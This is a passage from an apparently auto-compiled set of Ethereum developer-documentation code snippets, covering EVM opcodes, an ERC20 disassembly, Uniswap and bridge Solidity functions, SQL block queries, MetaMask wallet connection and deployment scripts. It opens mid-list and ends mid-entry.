232521664, 232652608, 232782272, 232914496,\n233043904, 233175616, 233306816, 233438528, 233569984, 233699776,\n233830592, 233962688, 234092224, 234221888, 234353984, 234485312,\n234618304, 234749888, 234880832, 235011776, 235142464, 235274048,\n235403456, 235535936, 235667392, 235797568, 235928768, 236057152,\n236190272, 236322752, 236453312, 236583616, 236715712, 236846528,\n236976448, 237108544, 237239104, 237371072, 237501632, 237630784,\n237764416, 237895232, 238026688, 238157632, 238286912, 238419392,\n238548032, 238681024, 238812608, 238941632, 239075008, 239206336,\n239335232, 239466944, 239599168, 239730496, 239861312, 239992384,\n240122816, 240254656, 240385856, 240516928, 240647872, 240779072,\n240909632, 241040704, 241171904, 241302848, 241433408, 241565248,\n241696192, 241825984, 241958848, 242088256, 242220224, 242352064,\n242481856, 242611648, 242744896, 242876224, 243005632, 243138496,\n243268672, 243400384, 243531712, 243662656, 243793856, 243924544,\n244054592, 244187072, 244316608, 244448704, 244580032, 244710976,\n244841536, 244972864, 245104448, 245233984, 245365312, 245497792,\n245628736, 245759936, 245889856, 246021056, 246152512, 246284224,\n246415168, 246545344, 246675904, 246808384, 246939584, 247070144,\n247199552, 247331648, 247463872, 247593536, 247726016, 247857088,\n247987648, 248116928, 248249536, 248380736, 248512064, 248643008,\n248773312, 248901056, 249036608, 249167552, 249298624, 249429184,\n249560512, 249692096, 249822784, 249954112, 250085312, 250215488,\n250345792, 250478528, 250608704, 250739264, 250870976, 251002816,\n251133632, 251263552, 251395136, 251523904, 251657792, 251789248,\n251919424, 252051392, 252182464, 252313408, 252444224, 252575552,\n252706624, 252836032, 252968512, 253099712, 253227584, 253361728,\n253493056, 253623488, 253754432, 253885504, 254017216, 254148032,\n254279488, 254410432, 254541376, 254672576, 254803264, 254933824,\n255065792, 255196736, 255326528, 255458752, 255589952, 255721408,\n255851072, 255983296, 256114624, 256244416, 256374208, 256507712,\n256636096, 256768832, 256900544, 257031616, 257162176, 257294272,\n257424448, 257555776, 257686976, 257818432, 257949632, 258079552,\n258211136, 258342464, 258473408, 258603712, 258734656, 258867008,\n258996544, 259127744, 259260224, 259391296, 259522112, 259651904,\n259784384, 259915328, 260045888, 260175424, 260308544, 260438336,\n260570944, 260700992, 260832448, 260963776, 261092672, 261226304,\n261356864, 261487936, 261619648, 261750592, 261879872, 262011968,\n262143424, 262274752, 262404416, 262537024, 262667968, 262799296,\n262928704, 263061184, 263191744, 263322944, 263454656, 263585216,\n263716672, 263847872, 263978944, 264108608, 264241088, 264371648,\n264501184, 264632768, 264764096, 264895936, 265024576, 265158464,\n265287488, 265418432, 265550528, 265681216, 265813312, 265943488,\n266075968, 266206144, 266337728, 266468032, 266600384, 266731072,\n266862272, 266993344, 267124288, 267255616, 267386432, 267516992,\n267648704, 267777728, 267910592, 268040512, 268172096, 268302784,\n268435264, 268566208, 268696256, 268828096, 268959296, 269090368,\n269221312, 269352256, 269482688, 269614784, 269745856, 269876416,\n270007616, 270139328, 270270272, 270401216, 270531904, 270663616,\n270791744, 270924736, 271056832, 271186112, 271317184, 271449536,\n271580992, 271711936, 271843136, 271973056, 272105408, 272236352,\n272367296, 272498368, 272629568, 272759488, 272891456, 273022784,\n273153856, 273284672, 273415616, 273547072, 273677632, 273808448,\n273937088, 274071488, 274200896, 274332992, 274463296, 274595392,\n274726208, 274857536, 274988992, 275118656, 275250496, 275382208,\n275513024, 275643968, 275775296, 275906368, 276037184, 276167872,\n276297664, 276429376, 276560576, 276692672, 276822976, 276955072,\n277085632, 277216832, 277347008, 277478848, 277609664, 277740992,\n277868608, 278002624, 278134336, 278265536, 278395328, 278526784,\n278657728, 278789824, 278921152, 279052096, 279182912, 279313088,\n279443776, 279576256, 279706048, 279838528, 279969728, 280099648,\n280230976, 280361408, 280493632, 280622528, 280755392, 280887104,\n281018176, 281147968, 281278912, 281411392, 281542592, 281673152,\n281803712, 281935552, 282066496, 282197312, 282329024, 282458816,\n282590272, 282720832, 282853184, 282983744, 283115072, 283246144,\n283377344, 283508416, 283639744, 283770304, 283901504, 284032576,\n284163136, 284294848, 284426176, 284556992, 284687296, 284819264,\n284950208, 285081536\n```\n\n----------------------------------------\n\nTITLE: ERC20 Token Opcodes Implementation\nDESCRIPTION: Disassembled EVM opcodes for an ERC20 token contract. The opcodes represent the runtime behavior of the contract, including function calls, storage operations, and error handling for the Basic (BSC) token.\n\nLANGUAGE: evm-opcodes\nCODE:\n```\nPUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH3 0x11 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH3 0x1539 CODESIZE SUB DUP1 PUSH3 0x1539 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE PUSH1 0x20 DUP2 LT ISZERO PUSH3 0x37 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x5 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x4261736963000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x3 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x4253430000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP2 PUSH1 0x3 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH3 0xCC SWAP3 SWAP2 SWAP1 PUSH3 0x389 JUMP JUMPDEST POP DUP1 PUSH1 0x4 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH3 0xE5 SWAP3 SWAP2 SWAP1 PUSH3 0x389 JUMP JUMPDEST POP PUSH1 0x12 PUSH1 0x5 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 PUSH1 0xFF AND MUL OR SWAP1 SSTORE POP POP POP PUSH3 0x116 CALLER DUP3 PUSH3 0x11D PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST POP PUSH3 0x438 JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH3 0x1C1 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x1F DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x45524332303A206D696E7420746F20746865207A65726F206164647265737300 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH3 0x1D5 PUSH1 0x0 DUP4 DUP4 PUSH3 0x2FB PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST PUSH3 0x1F1 DUP2 PUSH1 0x2 SLOAD PUSH3 0x300 PUSH1 0x20 SHL PUSH3 0xF2D OR SWAP1 SWAP2 SWAP1 PUSH1 0x20 SHR JUMP JUMPDEST PUSH1 0x2 DUP2 SWAP1 SSTORE POP PUSH3 0x24F DUP2 PUSH1 0x0 DUP1 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH3 0x300 PUSH1 0x20 SHL PUSH3 0xF2D OR SWAP1 SWAP2 SWAP1 PUSH1 0x20 SHR JUMP JUMPDEST PUSH1 0x0 DUP1 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF DUP4 PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 DUP3 DUP5 ADD SWAP1 POP DUP4 DUP2 LT ISZERO PUSH3 0x37F JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x1B DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x536166654D6174683A206164646974696F6E206F766572666C6F770000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 PUSH1 0x1F ADD PUSH1 0x20 SWAP1 DIV DUP2 ADD SWAP3 DUP3 PUSH1 0x1F LT PUSH3 0x3CC JUMPI DUP1 MLOAD PUSH1 0xFF NOT AND DUP4 DUP1 ADD OR DUP6 SSTORE PUSH3 0x3FD JUMP JUMPDEST DUP3 DUP1 ADD PUSH1 0x1 ADD DUP6 SSTORE DUP3 ISZERO PUSH3 0x3FD JUMPI SWAP2 DUP3 ADD JUMPDEST DUP3 DUP2 GT ISZERO PUSH3 0x3FC JUMPI DUP3 MLOAD DUP3 SSTORE SWAP2 PUSH1 0x20 ADD SWAP2 SWAP1 PUSH1 0x1 ADD SWAP1 PUSH3 0x3DF JUMP JUMPDEST JUMPDEST POP SWAP1 POP PUSH3 0x40C SWAP2 SWAP1 PUSH3 0x410 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST PUSH3 0x435 SWAP2 SWAP1 JUMPDEST DUP1 DUP3 GT ISZERO PUSH3 0x431 JUMPI PUSH1 0x0 DUP2 PUSH1 0x0 SWAP1 SSTORE POP PUSH1 0x1 ADD PUSH3 0x417 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST SWAP1 JUMP JUMPDEST PUSH2 0x10F1 DUP1 PUSH3 0x448 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0xA9 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x39509351 GT PUSH2 0x71 JUMPI DUP1 PUSH4 0x39509351 EQ PUSH2 0x25F JUMPI DUP1 PUSH4 0x70A08231 EQ PUSH2 0x2C5 JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x31D JUMPI DUP1 PUSH4 0xA457C2D7 EQ PUSH2 0x3A0 JUMPI DUP1 PUSH4 0xA9059CBB EQ PUSH2 0x406 JUMPI DUP1 PUSH4 0xDD62ED3E EQ PUSH2 0x46C JUMPI PUSH2 0xA9 JUMP JUMPDEST DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0xAE JUMPI DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0x131 JUMPI DUP1 PUSH4 0x18160DDD EQ PUSH2 0x197 JUMPI DUP1 PUSH4 0x23B872DD EQ PUSH2 0x1B5 JUMPI DUP1 PUSH4 0x313CE567 EQ PUSH2 0x23B JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xB6 PUSH2 0x4E4 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xF6 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0xDB JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x123 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x17D PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x147 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x586 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x19F PUSH2 0x5A4 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x221 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x60 DUP2 LT ISZERO PUSH2 0x1CB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x5AE JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x243 PUSH2 0x687 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH1 0xFF AND PUSH1 0xFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x2AB PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x275 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x69E JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x307 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x2DB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x751 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x325 PUSH2 0x799 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x365 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x34A JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x392 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x3EC PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x3B6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD\n```\n\n----------------------------------------\n\nTITLE: CALL Operation in EVM (F1)\nDESCRIPTION: Performs a call to another contract. Transfers value and executes code at the target address with the specified arguments, storing any return data in memory.\n\nLANGUAGE: solidity\nCODE:\n```\nmem[retOst:retOst+retLen-1] := returndata\n```\n\n----------------------------------------\n\nTITLE: Defining Swap Event in Uniswap Pair\nDESCRIPTION: Defines the event emitted when a trader exchanges one token for another. Includes information about token amounts going in and out and the addresses involved.\n\nLANGUAGE: solidity\nCODE:\n```\nevent Swap(\n    address indexed sender,\n    uint amount0In,\n    uint amount1In,\n    uint amount0Out,\n    uint amount1Out,\n    address indexed to\n);\n```\n\n----------------------------------------\n\nTITLE: External Add Liquidity Function Declaration in Solidity\nDESCRIPTION: The function signature for the external addLiquidity function that users can call to add liquidity to a token pair, including parameters for token addresses, desired and minimum amounts, recipient, and deadline.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction addLiquidity(\n    address tokenA,\n    address tokenB,\n    uint amountADesired,\n    uint amountBDesired,\n    uint amountAMin,\n    uint amountBMin,\n    address to,\n    uint deadline\n```\n\n----------------------------------------\n\nTITLE: Querying Average Daily Block Count in Ethereum\nDESCRIPTION: SQL query that calculates the average number of blocks produced per day on the Ethereum blockchain. The query first creates a temporary table grouping blocks by day, then calculates the overall average.\n\nLANGUAGE: sql\nCODE:\n```\nWITH temp_table AS (\nSELECT\n    DATE_TRUNC('day', time) AS dt,\n    COUNT(*) AS block_count\nFROM ethereum.\"blocks\"\nGROUP BY dt\nOFFSET 1\n)\nSELECT\n    AVG(block_count) AS avg_block_count\nFROM temp_table\n```\n\n----------------------------------------\n\nTITLE: Adding Test Script Configuration to package.json\nDESCRIPTION: JSON configuration for package.json that adds the test script using Mocha and ts-node to run TypeScript test files.\n\nLANGUAGE: json\nCODE:\n```\n\"scripts\": {\n    \"build\": \"waffle\",\n    \"test\": \"export NODE_ENV=test && mocha -r ts-node/register 'test/**/*.test.ts'\"\n  }\n```\n\n----------------------------------------\n\nTITLE: Using useEffect to Check Wallet Connection on Component Mount\nDESCRIPTION: This React useEffect hook calls getCurrentWalletConnected when the component mounts. It updates the component state with the wallet address and status, enabling the UI to reflect the current connection state even after page refreshes.\n\nLANGUAGE: javascript\nCODE:\n```\nuseEffect(async () => {\n  const { address, status } = await getCurrentWalletConnected()\n  setWallet(address)\n  setStatus(status)\n}, [])\n```\n\n----------------------------------------\n\nTITLE: Filtering Gas-Reducing Functions in Echidna\nDESCRIPTION: YAML configuration that blacklists specific functions to better identify high gas consumption operations.\n\nLANGUAGE: yaml\nCODE:\n```\nfilterBlacklist: true\nfilterFunctions: [\"pop\", \"clear\"]\n```\n\n----------------------------------------\n\nTITLE: Exporting Solidity Verifier\nDESCRIPTION: Generates a Solidity contract that can be deployed to verify proofs created by the dig program, including map size information in a comment.\n\nLANGUAGE: typescript\nCODE:\n```\nconst solidityVerifier = `\n        // Map size: ${width} x ${height}\n        \\n${zokrates.exportSolidityVerifier(verifierKey)}\n        `\n```\n\n----------------------------------------\n\nTITLE: Fallback WETH Transfer Logic in Python Decompiled from Solidity\nDESCRIPTION: A code snippet implementing fallback logic to send WETH when direct ETH transfer fails. This ensures recipients who can't receive ETH directly (some contracts) can still receive value as an ERC-20 token.\n\nLANGUAGE: python\nCODE:\n```\n  if not return_data.size:\n      if not ext_call.success:\n          require ext_code.size(stor2)\n          call stor2.deposit() with:\n             value unknown81e580d3[_param1] * _param3 / 100 * 10^6 wei\n```\n\n----------------------------------------\n\nTITLE: Implementing MetaMask Wallet Connection Function in JavaScript\nDESCRIPTION: Function that handles connecting to MetaMask wallet. It checks if MetaMask is installed, requests access to user accounts, and returns appropriate status messages based on the connection result.\n\nLANGUAGE: javascript\nCODE:\n```\n// interact.js\n\nexport const connectWallet = async () => {\n  if (window.ethereum) {\n    try {\n      const addressArray = await window.ethereum.request({\n        method: \"eth_requestAccounts\",\n      })\n      const obj = {\n        status: \"👆🏽 Write a message in the text-field above.\",\n        address: addressArray[0],\n      }\n      return obj\n    } catch (err) {\n      return {\n        address: \"\",\n        status: \"😥 \" + err.message,\n      }\n    }\n  } else {\n    return {\n      address: \"\",\n      status: (\n        <span>\n          <p>\n            {\" \"}\n            🦊 <a target=\"_blank\" href={`https://metamask.io/download.html`}>\n              You must install MetaMask, a virtual Ethereum wallet, in your\n              browser.\n            </a>\n          </p>\n        </span>\n      ),\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Understanding CREATE Opcode in EVM (F0)\nDESCRIPTION: The CREATE opcode (F0) creates a new contract by taking value, offset, and length parameters and returning the new contract address. The address is calculated using the sender's address and nonce.\n\nLANGUAGE: evm\nCODE:\n```\naddr = keccak256(rlp([address(this), this.nonce]))\n```\n\n----------------------------------------\n\nTITLE: Defining depositERC20To Function for Directed L1 to L2 Token Transfers\nDESCRIPTION: Similar to depositERC20, but allows specifying a different recipient address on L2. Useful for sending tokens to another address across the bridge rather than mirroring the sender's address.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev deposit an amount of ERC20 to a recipient's balance on L2.\n     * @param _l1Token Address of the L1 ERC20 we are depositing\n     * @param _l2Token Address of the L1 respective L2 ERC20\n     * @param _to L2 address to credit the withdrawal to.\n     * @param _amount Amount of the ERC20 to deposit.\n     * @param _l2Gas Gas limit required to complete the deposit on L2.\n     * @param _data Optional data to forward to L2. This data is provided\n     *        solely as a convenience for external contracts. Aside from enforcing a maximum\n     *        length, these contracts provide no guarantees about its content.\n     */\n    function depositERC20To(\n        address _l1Token,\n        address _l2Token,\n        address _to,\n        uint256 _amount,\n        uint32 _l2Gas,\n        bytes calldata _data\n    ) external;\n```\n\n----------------------------------------\n\nTITLE: RETURN Operation in Ethereum VM\nDESCRIPTION: The RETURN opcode (0xF3) returns data from memory to the caller, specifying offset and length of the data to return.\n\nLANGUAGE: solidity\nCODE:\n```\nreturn mem[ost:ost+len-1]\n```\n\n----------------------------------------\n\nTITLE: Calculating Average Gas Price to Offset ETH Issuance\nDESCRIPTION: Formula for calculating the average gas price in gwei needed to offset the daily ETH issuance of 1700 ETH through transaction fees.\n\nLANGUAGE: markdown\nCODE:\n```\n- `7200 blocchi/giorno * 15x10^6 gas/blocco *`**`Y gwei/gas`**`* 1 ETH/ 10^9 gwei = 1700 ETH/giorno`\n```\n\n----------------------------------------\n\nTITLE: Creating a Deployment Script for Smart Contract\nDESCRIPTION: JavaScript deployment script that uses ethers.js to deploy the HelloWorld smart contract to Ethereum. It initializes the contract factory, deploys the contract with an initial message, and outputs the contract address.\n\nLANGUAGE: javascript\nCODE:\n```\nasync function main() {\n   const HelloWorld = await ethers.getContractFactory(\"HelloWorld\");\n\n   // Start deployment, returning a promise that resolves to a contract object\n   const hello_world = await HelloWorld.deploy(\"Hello World!\");\n   console.log(\"Contract deployed to address:\", hello_world.address);}\n\nmain()\n  .then(() => process.exit(0))\n  .catch(error => {\n    console.error(error);\n    process.exit(1);\n  });\n```\n\n----------------------------------------\n\nTITLE: Setting Up JavaScript Client for Cache Contract\nDESCRIPTION: JavaScript code for initializing the main function and retrieving function signatures from the smart contract. It also generates a unique key based on the current timestamp.\n\nLANGUAGE: javascript\nCODE:\n```\n.\n.\n.\nconst main = async () => {\n    const func = await worm.WRITE_ENTRY_CACHED()\n\n    // Need a new key every time\n    const key = await worm.encodeVal(Number(new Date()))\n```\n\n----------------------------------------\n\nTITLE: Retrieving the latest block number using callback pattern\nDESCRIPTION: A complete example showing how to use web3.js to retrieve the latest block number from the Ethereum blockchain using the callback pattern.\n\nLANGUAGE: javascript\nCODE:\n```\nvar Web3 = require(\"web3\")\nconst web3 = new Web3(\"https://cloudflare-eth.com\")\n\nweb3.eth.getBlockNumber(function (error, result) {\n  console.log(result)\n})\n```\n\n----------------------------------------\n\nTITLE: Querying Daily Block Production on Ethereum since 2016\nDESCRIPTION: This SQL query counts the number of blocks produced daily on the Ethereum blockchain since 2016. It groups the blocks by day and counts them to show the daily production rate.\n\nLANGUAGE: sql\nCODE:\n```\nSELECT\n    DATE_TRUNC('day', time) AS dt,\n    COUNT(*) AS block_count\nFROM ethereum.\"blocks\"\nGROUP BY dt\nOFFSET 1\n```\n\n----------------------------------------\n\nTITLE: Implementing ETH Deposit Functions\nDESCRIPTION: Implements the public-facing functions for depositing ETH to L2. These functions wrap the internal _initiateETHDeposit function, allowing users to deposit ETH to their own address or to another address on L2 with custom gas parameters.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @inheritdoc IL1StandardBridge\n     */\n    function depositETH(uint32 _l2Gas, bytes calldata _data) external payable onlyEOA {\n        _initiateETHDeposit(msg.sender, msg.sender, _l2Gas, _data);\n    }\n\n    /**\n     * @inheritdoc IL1StandardBridge\n     */\n    function depositETHTo(\n        address _to,\n        uint32 _l2Gas,\n        bytes calldata _data\n    ) external payable {\n        _initiateETHDeposit(msg.sender, _to, _l2Gas, _data);\n    }\n```\n\n----------------------------------------\n\nTITLE: Creating Project Directory Structure for NFT Development\nDESCRIPTION: Shell commands for creating an NFT project directory structure. These commands create a root project folder and subdirectories for storing smart contracts and deployment scripts.\n\nLANGUAGE: bash\nCODE:\n```\nmkdir my-nft\ncd my-nft\n```\n\n----------------------------------------\n\nTITLE: Implementing balanceOf Function for ERC-721\nDESCRIPTION: A view function that returns the number of NFTs owned by a specific address. It throws an error if the specified address is the zero address, as NFTs assigned to the zero address are considered invalid.\n\nLANGUAGE: vyper\nCODE:\n```\n@view\n@external\ndef balanceOf(_owner: address) -> uint256:\n    \"\"\"\n    @dev Returns the number of NFTs owned by `_owner`.\n         Throws if `_owner` is the zero address. NFTs assigned to the zero address are considered invalid.\n    @param _owner Address for whom to query the balance.\n    \"\"\"\n    assert _owner != ZERO_ADDRESS\n    return self.ownerToNFTokenCount[_owner]\n```\n\n----------------------------------------\n\nTITLE: Initialisieren eines Hardhat-Projekts\nDESCRIPTION: Befehl zum Initialisieren eines leeren Hardhat-Projekts. Dies erstellt eine hardhat.config.js-Datei, in der alle Einstellungen für das Projekt konfiguriert werden können.\n\nLANGUAGE: 